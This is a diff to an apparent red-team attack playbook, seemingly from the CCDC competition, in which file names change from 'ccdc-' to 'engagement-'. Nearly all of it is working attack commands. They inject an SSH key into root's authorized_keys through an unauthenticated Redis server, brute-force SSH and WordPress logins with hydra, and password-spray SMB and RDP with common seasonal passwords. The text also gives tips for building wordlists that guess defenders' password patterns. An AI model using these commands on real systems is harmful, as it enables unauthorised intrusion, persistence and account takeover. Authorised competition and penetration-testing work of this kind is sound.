@@ -500,7 +500,7 @@ redis-cli -h <target> INFO server
 If this returns server information, you have full access. For RCE via SSH key injection:
 
 ```
-redis-cli -h <target> -x SET crackit < ~/.ssh/ccdc-persist.pub
+redis-cli -h <target> -x SET crackit < ~/.ssh/engagement-persist.pub
 redis-cli -h <target> CONFIG SET dir /root/.ssh/
 redis-cli -h <target> CONFIG SET dbfilename "authorized_keys"
 redis-cli -h <target> SAVE
@@ -552,8 +552,8 @@ netexec smb <subnet>/24 -u Administrator -p 'Winter2025!' --continue-on-success
 
 For SSH/Linux targets:
 ```
-hydra -l root -P /tmp/ccdc-wordlist.txt ssh://<target> -t 4 -f
-hydra -l admin -P /tmp/ccdc-wordlist.txt ssh://<target> -t 4 -f
+hydra -l root -P /tmp/engagement-wordlist.txt ssh://<target> -t 4 -f
+hydra -l admin -P /tmp/engagement-wordlist.txt ssh://<target> -t 4 -f
 ```
 
 For RDP:
@@ -563,7 +563,7 @@ netexec rdp <subnet>/24 -u Administrator -p 'Password1!' --continue-on-success
 
 For web application logins (WordPress, phpMyAdmin, Roundcube):
 ```
-hydra -l admin -P /tmp/ccdc-wordlist.txt <target> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 4 -f
+hydra -l admin -P /tmp/engagement-wordlist.txt <target> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 4 -f
 ```
 
 Create an engagement-specific wordlist before the engagement begins. Include common patterns: SeasonYear (Spring2026, Winter2025), and variations with special characters (P@ssw0rd!, Adm1n2026!). Many defensive teams follow predictable password change patterns. The `/start-ops` command generates this wordlist at `/tmp/engagement-wordlist.txt`.
